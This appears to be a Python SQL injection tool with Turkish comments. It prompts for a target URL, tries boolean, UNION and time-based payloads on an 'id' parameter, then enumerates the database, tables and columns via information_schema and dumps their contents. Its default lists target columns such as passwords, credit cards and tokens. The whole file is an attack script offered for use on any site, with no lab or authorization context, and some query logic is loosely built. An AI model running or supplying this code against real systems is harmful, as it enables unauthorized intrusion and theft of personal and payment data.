import requests

# Kullanılacak potansiyel tablo ve sütun isimleri
TABLES = [
    "users", "admin", "accounts", "customers", "orders",
    "employees", "sessions", "transactions", "products", "inventory",
    "logs", "messages", "settings", "config", "feedback",
    "reviews", "payments", "tokens", "cart", "categories"
]

COLUMNS = [
    "id", "username", "password", "email", "credit_card",
    "name", "phone", "address", "dob", "gender",
    "session_id", "ip_address", "login_time", "balance", "order_id",
    "product_id", "category", "amount", "status", "comments"
]

# Payload listesi
PAYLOADS = [
    "' OR 1=1 -- -",
    "' UNION SELECT NULL, NULL, NULL -- -",
    "' AND 1=1 -- -",
    "' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 65 -- -",
    "' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -",
    "' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_schema=database() -- -",
    "' OR 'x'='x' -- -",
    "' OR sleep(5) -- -",
    "' UNION SELECT @@version, user(), database() -- -"
]


# Veritabanı adı tespiti
def get_database_name(url):
    payload = "' UNION SELECT database(), NULL, NULL -- -"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url, timeout=5)
    if response.status_code == 200:
        print("[+] Veritabanı adı tespit edildi.")
        return extract_response(response.text)
    return None


# Tabloların keşfi
def get_tables(url):
    payload = "' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database() -- -"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url, timeout=5)
    if response.status_code == 200:
        print("[+] Tablolar tespit edildi.")
        return extract_response(response.text).split(',')
    return TABLES


# Sütunların keşfi
def get_columns(url, table_name):
    payload = f"' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name='{table_name}' -- -"
    test_url = f"{url}?id={payload}"
    response = requests.get(test_url, timeout=5)
    if response.status_code == 200:
        print(f"[+] {table_name} tablosundaki sütunlar tespit edildi.")
        return extract_response(response.text).split(',')
    return COLUMNS


# Verileri çekme
def extract_data(url, table_name, columns):
    for column_group in [columns[i:i + 3] for i in range(0, len(columns), 3)]:
        col_select = ", ".join(column_group)
        payload = f"' UNION SELECT {col_select}, NULL, NULL FROM {table_name} -- -"
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url, timeout=5)
        if response.status_code == 200:
            print(f"[+] {table_name} tablosundan veri:\n{extract_response(response.text)}")


# HTML'den veri ayıklama
def extract_response(response_text):
    start = response_text.find("<body>") + 6
    end = response_text.find("</body>")
    return response_text[start:end].strip()


# SQL Injection açık testi
def test_sql_injection(url):
    for payload in PAYLOADS:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"[+] Açık bulunan URL: {test_url}")
                return test_url
        except Exception as e:
            print(f"Hata: {e}")
    return None


# Ana işlem
if __name__ == "__main__":
    print("Gelişmiş SQL Injection Aracı")
    target_url = input("Hedef URL (ör. http://site.com/endpoint): ")

    # SQL Injection açık testi
    vulnerable_url = test_sql_injection(target_url)
    if vulnerable_url:
        # Veritabanı işlemleri
        database_name = get_database_name(vulnerable_url)
        if database_name:
            print(f"[+] Veritabanı: {database_name}")
            tables = get_tables(vulnerable_url)
            for table in tables:
                print(f"[+] Tablo: {table}")
                columns = get_columns(vulnerable_url, table)
                if columns:
                    print(f"[+] {table} tablosundaki sütunlar: {', '.join(columns)}")
                    extract_data(vulnerable_url, table, columns)
    else:
        print("[-] SQL Injection açığı bulunamadı.")
